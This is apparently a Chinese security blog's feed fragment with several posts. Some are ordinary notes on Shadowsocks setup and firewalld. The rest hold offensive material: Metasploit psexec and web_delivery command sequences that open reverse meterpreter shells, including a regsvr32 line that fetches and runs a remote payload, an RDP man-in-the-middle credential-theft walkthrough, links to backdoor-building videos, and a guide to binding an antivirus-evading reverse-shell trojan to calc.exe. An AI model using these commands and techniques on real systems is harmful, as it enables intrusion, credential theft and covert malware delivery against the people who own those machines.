    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>内网渗透中获得管理员用户名密码之后，通过SMB端口445来与目标机器的设备建立连接的后渗透技巧。</p></blockquote><a id="more"></a><h3 id="exploit-windows-smb-psexec"><a href="#exploit-windows-smb-psexec" class="headerlink" title="exploit/windows/smb/psexec"></a>exploit/windows/smb/psexec</h3><p><code>msf &gt; use exploit/windows/smb/psexec</code><br><code>msf exploit(windows/smb/psexec) &gt; set rhost 192.168.2.118</code><br><code>msf exploit(windows/smb/psexec) &gt; set smbuser administrator</code><br><code>msf exploit(windows/smb/psexec) &gt; set smbpass P@ssw0rd</code><br><code>msf exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf exploit(windows/smb/psexec) &gt; set LHOST 192.168.2.145</code><br><code>msf exploit(windows/smb/psexec) &gt; set LPORT 4444</code><br><code>msf exploit(windows/smb/psexec) &gt; exploit</code></p><blockquote><p>执行后有一个session回连<br>经实验表明，使用本地账户即使是管理员权限也不能使用此方法得到一个 meterpreter ，只能使用 administrator 的用户名密码才能回来一个 session ；<br>当在域环境使用时，smbuser 不是写成domain/administrator （这样的用户名是Exploit failed 执行不成功的）而是写成 administrator ，并且只要是域管理员都能执行成功并反弹一个 meterpreter 的 session 。</p></blockquote><h3 id="exploit-windows-smb-psexec-psh"><a href="#exploit-windows-smb-psexec-psh" class="headerlink" title="exploit/windows/smb/psexec_psh"></a>exploit/windows/smb/psexec_psh</h3><p><code>msf &gt; use exploit/windows/smb/psexec_psh</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set rhost 192.168.2.118</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set smbuser administrator</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set smbpass P@ssw0rd</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set lhost 192.168.2.145</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; set lport 4444</code><br><code>msf exploit(windows/smb/psexec_psh) &gt; exploit</code> </p><h3 id="exploit-multi-script-web-delivery"><a href="#exploit-multi-script-web-delivery" class="headerlink" title="exploit/multi/script/web_delivery"></a>exploit/multi/script/web_delivery</h3><p>使用exploit/multi/script/web_delivery 生成恶意dll代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery </span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; show targets </span><br><span class="line">Exploit targets:</span><br><span class="line">   Id  Name</span><br><span class="line">---</span><br><span class="line">   0   Python</span><br><span class="line">   1   PHP</span><br><span class="line">   2   PSH</span><br><span class="line">   3   Regsvr32</span><br><span class="line">   4   PSH (Binary)</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set target 3</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set lhost 192.168.2.145</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; set lport 4444</span><br><span class="line">msf exploit(multi/script/web_delivery) &gt; exploit </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Started reverse TCP handler on 192.168.2.145:4444 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/s7sa27EEtl</span><br><span class="line">[*] Local IP: http://192.168.2.145:8080/s7sa27EEtl</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll</span><br></pre></td></tr></table></figure><h3 id="auxiliary-admin-smb-psexec-command"><a href="#auxiliary-admin-smb-psexec-command" class="headerlink" title="auxiliary/admin/smb/psexec_command"></a>auxiliary/admin/smb/psexec_command</h3><p>使用 auxiliary/admin/smb/psexec_command 在远程目标上执行命令种恶意 dll 回连 meterpreter ；<br><code>msf &gt; use auxiliary/admin/smb/psexec_command</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.2.118</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set smbuser admin1</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set smbpass P@ssw0rd</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set command regsvr32 /s /n /u /i:http://192.168.2.145:8080/s7sa27EEtl.sct scrobj.dll</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set payload windows/meterpreter/reverse_tcp</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set lhost 192.168.2.145</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; set lport 4444</code><br><code>msf auxiliary(admin/smb/psexec_command) &gt; exploit</code></p><p>经实验表明，当目标机器有杀毒软件的时候，会拦截其从服务器上下载恶意 dll 文件 s7sa27EEtl.sct （测试机为赛门铁克未授权版），毕竟 msf 的恶意dll 特征码已经被杀毒引擎收录，如果确定目标机其没有杀软便可使用。</p><h3 id="auxiliary-scanner-smb-impacket-wmiexec"><a href="#auxiliary-scanner-smb-impacket-wmiexec" class="headerlink" title="auxiliary/scanner/smb/impacket/wmiexec"></a>auxiliary/scanner/smb/impacket/wmiexec</h3><p><code>msf auxiliary(admin/smb/psexec_command) &gt; use auxiliary/scanner/smb/impacket/wmiexec</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set rhosts 192.168.2.118</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbuser admin1</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set smbpass P@ssw0rd</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; set command ipconfig /all</code><br><code>msf auxiliary(scanner/smb/impacket/wmiexec) &gt; exploit</code> </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;内网渗透中获得管理员用户名密码之后，通过SMB端口445来与目标机器的设备建立连接的后渗透技巧。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="MSF" scheme="https://yaalonsong.github.io/categories/msf/"/>
    
    
      <category term="内网" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="msf" scheme="https://yaalonsong.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>CentOS 7 安装 Shadowscoks</title>
    <link href="https://yaalonsong.github.io/2018/07/31/CentOS-7-%E5%AE%89%E8%A3%85-shadowscoks.html"/>
    <id>https://yaalonsong.github.io/2018/07/31/CentOS-7-安装-shadowscoks.html</id>
    <published>2018-07-31T14:54:56.882Z</published>
    <updated>2018-08-22T17:16:52.388Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>首先安装 pip ，使用 pip 安装 Shadowsocks </p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum upgrade</span><br><span class="line">yum install python-pip</span><br><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure></li><li><p>新建 Shadowsocks 的配置文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/shadowsocks.json</span><br></pre></td></tr></table></figure></li><li><p>编辑 Shadowocks 配置文件</p></li><li><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>:<span class="string">"0.0.0.0"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>:<span class="number">1111</span>,</span><br><span class="line">    <span class="attr">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>:<span class="number">1080</span>,</span><br><span class="line">    <span class="attr">"password"</span>:<span class="string">"yourpassword"</span>,</span><br><span class="line">    <span class="attr">"timeout"</span>:<span class="number">300</span>,</span><br><span class="line">    <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line">    <span class="attr">"fast_open"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置firewall，允许 Shadowsocks 服务端口被外网访问</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">以下命令会永久生效</span><br><span class="line">firewall-<span class="built_in">cmd</span> --zone=public --add-port=<span class="number">1111</span>/tcp --permanent</span><br><span class="line">重新载入 firewall</span><br><span class="line">firewall-<span class="built_in">cmd</span> --reload</span><br></pre></td></tr></table></figure></li><li><p>启动 ssserver 服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br><span class="line">ssserver -c /etc/shadowsocks.json -d restart</span><br><span class="line">ssserver -c /etc/shadowsocks.json -d stop</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;首先安装 pip ，使用 pip 安装 Shadowsocks &lt;/p&gt;
    
    </summary>
    
      <category term="vps，SS" scheme="https://yaalonsong.github.io/categories/vps%EF%BC%8CSS/"/>
    
    
      <category term="CentOS" scheme="https://yaalonsong.github.io/tags/CentOS/"/>
    
      <category term="shadowscoks" scheme="https://yaalonsong.github.io/tags/shadowscoks/"/>
    
  </entry>
  
  <entry>
    <title>CentOS7 使用 Firewalld 打开关闭防火墙与端口</title>
    <link href="https://yaalonsong.github.io/2018/07/31/CentOS7_firewalld.html"/>
    <id>https://yaalonsong.github.io/2018/07/31/CentOS7_firewalld.html</id>
    <published>2018-07-31T14:23:46.002Z</published>
    <updated>2018-08-22T17:16:45.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="firewalld的基本使用"><a href="#firewalld的基本使用" class="headerlink" title="firewalld的基本使用"></a>firewalld的基本使用</h2><a id="more"></a><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">启动： systemctl <span class="built_in">start</span> firewalld （service firewalld <span class="built_in">start</span>）</span><br><span class="line">关闭： systemctl stop firewalld  （service firewalld stop）</span><br><span class="line">查看状态： systemctl status firewalld </span><br><span class="line">开机禁用  ： systemctl disable firewalld</span><br><span class="line">开机启用  ： systemctl enable firewalld</span><br></pre></td></tr></table></figure><h2 id="systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。"><a href="#systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。" class="headerlink" title="systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。"></a>systemctl是CentOS7的服务管理工具中主要的工具，它融合之前service和chkconfig的功能于一体。</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">启动一个服务：systemctl <span class="built_in">start</span> firewalld.service</span><br><span class="line">关闭一个服务：systemctl stop firewalld.service</span><br><span class="line">重启一个服务：systemctl restart firewalld.service</span><br><span class="line">显示一个服务的状态：systemctl status firewalld.service</span><br><span class="line">在开机时启用一个服务：systemctl enable firewalld.service</span><br><span class="line">在开机时禁用一个服务：systemctl disable firewalld.service</span><br><span class="line">查看服务是否开机启动：systemctl is-enabled firewalld.service</span><br><span class="line">查看已启动的服务列表：systemctl list-unit-files|grep enabled</span><br><span class="line">查看启动失败的服务列表：systemctl --failed</span><br></pre></td></tr></table></figure><h2 id="配置firewalld-cmd"><a href="#配置firewalld-cmd" class="headerlink" title="配置firewalld-cmd"></a>配置firewalld-cmd</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看版本： firewall-<span class="built_in">cmd</span> --version</span><br><span class="line">查看帮助： firewall-<span class="built_in">cmd</span> --<span class="built_in">help</span></span><br><span class="line">显示状态： firewall-<span class="built_in">cmd</span> --state</span><br><span class="line">查看所有打开的端口： firewall-<span class="built_in">cmd</span> --zone=public --list-ports</span><br><span class="line">更新防火墙规则： firewall-<span class="built_in">cmd</span> --reload</span><br><span class="line">查看区域信息:  firewall-<span class="built_in">cmd</span> --get-active-zones</span><br><span class="line">查看指定接口所属区域： firewall-<span class="built_in">cmd</span> --get-zone-of-interface=eth0</span><br><span class="line">拒绝所有包：firewall-<span class="built_in">cmd</span> --panic-on</span><br><span class="line">取消拒绝状态： firewall-<span class="built_in">cmd</span> --panic-off</span><br><span class="line">查看是否拒绝： firewall-<span class="built_in">cmd</span> --query-panic</span><br></pre></td></tr></table></figure><h2 id="对一个端口的开启-查看-删除操作"><a href="#对一个端口的开启-查看-删除操作" class="headerlink" title="对一个端口的开启/查看/删除操作"></a>对一个端口的开启/查看/删除操作</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加:  firewall-<span class="built_in">cmd</span> --zone=public --add-port=<span class="number">444</span>/tcp --permanent    (--permanent永久生效，没有此参数重启后失效)</span><br><span class="line">重新载入:  firewall-<span class="built_in">cmd</span> --reload</span><br><span class="line">查看:  firewall-<span class="built_in">cmd</span> --zone=public --query-port=<span class="number">444</span>/tcp</span><br><span class="line">删除:  firewall-<span class="built_in">cmd</span> --zone=public --remove-port=<span class="number">444</span>/tcp --permanent</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;firewalld的基本使用&quot;&gt;&lt;a href=&quot;#firewalld的基本使用&quot; class=&quot;headerlink&quot; title=&quot;firewalld的基本使用&quot;&gt;&lt;/a&gt;firewalld的基本使用&lt;/h2&gt;
    
    </summary>
    
      <category term="Linux命令" scheme="https://yaalonsong.github.io/categories/Linux%E5%91%BD%E4%BB%A4/"/>
    
    
      <category term="CentOS" scheme="https://yaalonsong.github.io/tags/CentOS/"/>
    
      <category term="firewall" scheme="https://yaalonsong.github.io/tags/firewall/"/>
    
  </entry>
  
  <entry>
    <title>通过降级连接劫持RDP明文凭据</title>
    <link href="https://yaalonsong.github.io/2018/05/03/seth.html"/>
    <id>https://yaalonsong.github.io/2018/05/03/seth.html</id>
    <published>2018-05-03T11:58:46.000Z</published>
    <updated>2018-08-22T17:17:44.928Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Seth是一种用Python和Bash编写的工具，用于通过尝试降级连接以提取明文凭据来进行MitM RDP连接。它的开发目的是为了提高认识，并在笔试，讲习班或会谈的背景下教育正确配置的RDP连接的重要性。作者是Adrian Vollmer（SySS GmbH）。</p></blockquote><a id="more"></a><h2 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./seth.sh &lt;INTERFACE&gt; &lt;ATTACKER IP&gt; &lt;VICTIM IP&gt; &lt;GATEWAY IP|HOST IP&gt; [&lt;COMMAND&gt;]</span><br><span class="line">实例：</span><br><span class="line">./seth.sh 网口 攻击者IP 访问RDP IP 被攻击者IP &lt;命令执行一般不用&gt;</span><br><span class="line">./seth.sh eth0 192.168.3.149 192.168.3.150 192.168.3.138</span><br><span class="line">与上面命令等价（如果所有机器在同一网段可用）：</span><br><span class="line">./seth.sh eth0 192.168.3.&#123;149,150,138&#125;</span><br></pre></td></tr></table></figure><h2 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h2><ul><li>项目地址：<a href="https://github.com/SySS-Research/Seth" target="_blank" rel="noopener">Seth</a></li></ul><ul><li>攻击者机器：kali 192.168.3.149</li><li>访问RDP机器：win 7 x64 192.168.3.150</li><li>被攻击者机器：win 10 x64 192.168.3.138</li></ul><blockquote><ol><li>欺骗ARP回复</li><li>启用IPv4流量转发，将流量从受害主机重定向到攻击者机器，然后再转发到目标RDP服务器。</li><li>配置一个iptable规则拒绝SYN数据包，以防止直接的RDP认证。</li><li>捕获目标主机的SYN数据包。</li><li>克隆SSL证书。<br>重新配置iptables规则，以将流量从受害工作站路由到目标RDP主机。</li><li>阻止到端口88的流量，以将Kerberos身份验证降级到NTLM。</li></ol></blockquote><ul><li>seth 执行完的界面：</li></ul><p><img src="/uploads/start.jpg" alt=""></p><ul><li>访问RDP的机器弹出，尝试通过RDP向目标服务器进行身份验证的用户将会收到以下消息：</li></ul><p><img src="/uploads/ssl.jpg" alt=""></p><ul><li>成功获取被攻击者RDP的用户名密码：</li></ul><p><img src="/uploads/mm.jpg" alt=""></p><ul><li><p>当以下复选框未选中时被攻击者可以直接登录系统，并且seth可以进行键盘记录。</p><p><img src="/uploads/ms.jpg" alt=""></p></li></ul><h2 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h2><ul><li>当我使用win 10 做为访问攻击目标RDP的机器时，win 10 直接报错 ，攻击机器显示类似“请确认加密方式是不是xxx”，不能抓到密码（也可能是我环境的问题）。</li><li>使用win 7 做为访问攻击目标RDP的机器，弹出ssl认证那个，未报错，只是进不去mstsc，重新登录即可（攻击机已经断开监听所以可以正常登录）。</li><li>使用win 8 做为访问攻击目标RDP的机器，弹出ssl认证那个，报错（但是不影响，点击重新登录即可登录成功）。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Seth是一种用Python和Bash编写的工具，用于通过尝试降级连接以提取明文凭据来进行MitM RDP连接。它的开发目的是为了提高认识，并在笔试，讲习班或会谈的背景下教育正确配置的RDP连接的重要性。作者是Adrian Vollmer（SySS GmbH）。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="RDP攻击" scheme="https://yaalonsong.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/RDP%E6%94%BB%E5%87%BB/"/>
    
    
      <category term="RDP" scheme="https://yaalonsong.github.io/tags/RDP/"/>
    
      <category term="内网渗透" scheme="https://yaalonsong.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>TheFatRat YouTube 视频</title>
    <link href="https://yaalonsong.github.io/2018/04/27/bypass-av.html"/>
    <id>https://yaalonsong.github.io/2018/04/27/bypass-av.html</id>
    <published>2018-04-26T16:05:58.000Z</published>
    <updated>2018-08-22T17:06:23.759Z</updated>
    
    <content type="html"><![CDATA[<p>TheFatRat<br><a id="more"></a></p><ul><li>Screetsec Channel : <a href="https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw" target="_blank" rel="noopener">https://www.youtube.com/channel/UCpK9IXzLMfVFp9NUfDzxFfw</a></li><li>Udate thefatrat v1.8 <a href="https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8" target="_blank" rel="noopener">https://youtu.be/6skLV6zPnec?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>file Pumper in linux with fatrat <a href="https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8" target="_blank" rel="noopener">https://youtu.be/rHuh5DJ476M?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>Kali linux 2016.2 | Setup FatRat and Bypass Windows 10 :<a href="https://www.youtube.com/watch?v=mkfKSCxvPec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=mkfKSCxvPec</a></li><li>Embed Backdoor Apk Andoird : <a href="https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be" target="_blank" rel="noopener">https://www.youtube.com/watch?v=bZg3gPuLvgs&amp;feature=youtu.be</a></li><li>Create Backdoor Php and Reconnect With TheFatRat : <a href="https://www.youtube.com/watch?v=gfS55fjd8Fg" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gfS55fjd8Fg</a></li><li>THEFATRAT:BACKDOOR CREATOR &amp; BYPASS ANTIVIRUS AND INSTALL. : <a href="https://www.youtube.com/watch?v=C4YHVKPw6Zo" target="_blank" rel="noopener">https://www.youtube.com/watch?v=C4YHVKPw6Zo</a></li><li>Exploit Windows 7/8/10 using Thefatrat ( option 2 ) : <a href="https://www.youtube.com/watch?v=-WbKOxIl_f4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=-WbKOxIl_f4</a></li><li>How to hack android device with FatRat on kali linux 2 :<a href="https://www.youtube.com/watch?v=yUuwnu-NUXE" target="_blank" rel="noopener">https://www.youtube.com/watch?v=yUuwnu-NUXE</a></li><li>Kali Linux Tools - TheFatRat Tool For Generate Backdoor with MsfVenom : <a href="https://www.youtube.com/watch?v=7PMfPbrM0o4" target="_blank" rel="noopener">https://www.youtube.com/watch?v=7PMfPbrM0o4</a></li><li>FUD 100 % Backdoor With TheFatRat pt.1 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=8lJBwclFwJI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=8lJBwclFwJI</a></li><li>FUD 100 % Backdoor With TheFatRat pt.2 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=t7E6DZPhLLk&amp;t=17s</a></li><li>FUD 100 % Backdoor With TheFatRat pt.3 [ PwnWinds ][ Bypass Antivirus ] : <a href="https://www.youtube.com/watch?v=wCzsD6vt9CQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wCzsD6vt9CQ</a></li><li>TheFatrat Backdoor Undetectable by Antivirus Kali linux part 3 :<a href="https://www.youtube.com/watch?v=wuOCDn0NvWc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wuOCDn0NvWc</a></li><li>1000 % FUD Backdoor with TheFatRat Tool : <a href="https://www.youtube.com/watch?v=vPXWv0jaBEQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=vPXWv0jaBEQ</a></li><li>How To Use TheFatRat To Create Backdoor In Kali Rolling [FUD 100%] : <a href="https://www.youtube.com/watch?v=26tSOuPcpZk" target="_blank" rel="noopener">https://www.youtube.com/watch?v=26tSOuPcpZk</a></li><li>Backdoor (Virus) 100% Indetectable | TheFatRat : <a href="https://www.youtube.com/watch?v=26tSOuPcpZk" target="_blank" rel="noopener">https://www.youtube.com/watch?v=26tSOuPcpZk</a></li><li>Backdooring Android with TheFatRat Tool- Kali Linux Tutorial :<a href="https://www.youtube.com/watch?v=1SQW9lujjT8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=1SQW9lujjT8</a></li><li>Hacking Windows using TheFatRat + Apache2 Server + Ettercap + Metasploit on Kali Linux 2016.2 <a href="https://www.youtube.com/watch?v=FlXMslSjnGw" target="_blank" rel="noopener">https://www.youtube.com/watch?v=FlXMslSjnGw</a></li><li>TheFatRat 1.9.6 - Trodebi ( Embed Trojan into Debian Package ) <a href="https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8" target="_blank" rel="noopener">https://youtu.be/NCsrcqhUBCc?list=PLbyfDadg3caj6nc3KBk375lKWDOjiCmb8</a></li><li>ALL VIDEO IN HERE : <a href="https://www.youtube.com/results?search_query=thefatrat+backdoor" target="_blank" rel="noopener">https://www.youtube.com/results?search_query=thefatrat+backdoor</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;TheFatRat&lt;br&gt;
    
    </summary>
    
      <category term="bypass-av" scheme="https://yaalonsong.github.io/categories/bypass-av/"/>
    
      <category term="免杀" scheme="https://yaalonsong.github.io/categories/bypass-av/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="https://yaalonsong.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="bypass-av" scheme="https://yaalonsong.github.io/tags/bypass-av/"/>
    
  </entry>
  
  <entry>
    <title>Veil-Evasion + pyJoiner 捆绑两个 EXE 的免杀木马</title>
    <link href="https://yaalonsong.github.io/2018/03/09/veil+pyJoiner.html"/>
    <id>https://yaalonsong.github.io/2018/03/09/veil+pyJoiner.html</id>
    <published>2018-03-09T15:29:20.000Z</published>
    <updated>2018-08-22T17:17:49.663Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在学习 veil 的 Veil-Evasion 模块，发现一款能捆绑两个 exe 文件的 pyJoiner 工具，便拿来学习学习。</p><a id="more"></a><h2 id="0x01-在kali-linux-2018-1-安装使用-veil-3-1-1-制作回连木马"><a href="#0x01-在kali-linux-2018-1-安装使用-veil-3-1-1-制作回连木马" class="headerlink" title="0x01 在kali linux 2018.1 安装使用 veil 3.1.1 制作回连木马"></a>0x01 在kali linux 2018.1 安装使用 veil 3.1.1 制作回连木马</h2><ul><li><p>Veil-Evasion 制作回连木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# veil</span><br><span class="line">use 1                        #选择使用 Veil-Evasion 模块</span><br><span class="line">Veil-Evasion Menu</span><br><span class="line">41 payloads loaded</span><br><span class="line">Available Commands:</span><br><span class="line">backGo to main Veil menu</span><br><span class="line">checkvtCheck virustotal against generated hashes</span><br><span class="line">cleanRemove generated artifacts</span><br><span class="line">exitExit Veil</span><br><span class="line">infoInformation on a specific payload</span><br><span class="line">listList available payloads</span><br><span class="line">useUse a specific payload</span><br><span class="line">Veil-Evasion command: use 11        #选择payload</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.3.149</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 4444</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] generate</span><br></pre></td></tr></table></figure><p><img src="/uploads/9.jpg" alt="veil"></p><p>使用以下命令开启监听：</p><p><code>root@kali:~# msfconsole  -r /var/lib/veil/output/handlers/test.rc</code></p></li></ul><h2 id="0x02-配置-pyJoiner—GUI-Version-运行环境"><a href="#0x02-配置-pyJoiner—GUI-Version-运行环境" class="headerlink" title="0x02 配置 pyJoiner—GUI-Version 运行环境"></a>0x02 配置 pyJoiner—GUI-Version 运行环境</h2><p>GitHub 上有两个版本 <a href="https://github.com/danielhnmoreno" target="_blank" rel="noopener">项目地址</a>  ，其中 kali 版必须使用 Kali Linux i386 ，我的是 x64 kali ，所以选择了 Windows版本的 pyJoiner—GUI-Version。</p><p>本次实验 pyJoiner 运行环境如下：</p><ul><li>Windows 10 </li><li>Python 3.6.3 </li><li>pyinstaller 3.3.1</li></ul><h2 id="0x03-将两个exe文件进行捆绑"><a href="#0x03-将两个exe文件进行捆绑" class="headerlink" title="0x03 将两个exe文件进行捆绑"></a>0x03 将两个exe文件进行捆绑</h2><p>这里捆绑的是 calc.exe 这个程序，将回连木马 test.exe 与其进行捆绑，过程如下：</p><p><code>py -3 pyJoiner.py</code>         #在 pyJoiner 目录下运行 CMD 执行命令，切记不要关闭CMD</p><p>打开 GUI 如下图：</p><p><img src="/uploads/10.jpg" alt="GUI"></p><p>实验中 file1 选择的 calc.exe ，file2 选择的回连木马test.exe， 选择好之后点击 Join 。</p><p>捆绑后生成的 exe 路径如下：</p><p><img src="/uploads/12.jpg" alt="路径"></p><h2 id="0x04-免杀回连测试"><a href="#0x04-免杀回连测试" class="headerlink" title="0x04 免杀回连测试"></a>0x04 免杀回连测试</h2><p>使用在线查杀引擎 virustotal 的结果如下：</p><p><img src="/uploads/13.jpg" 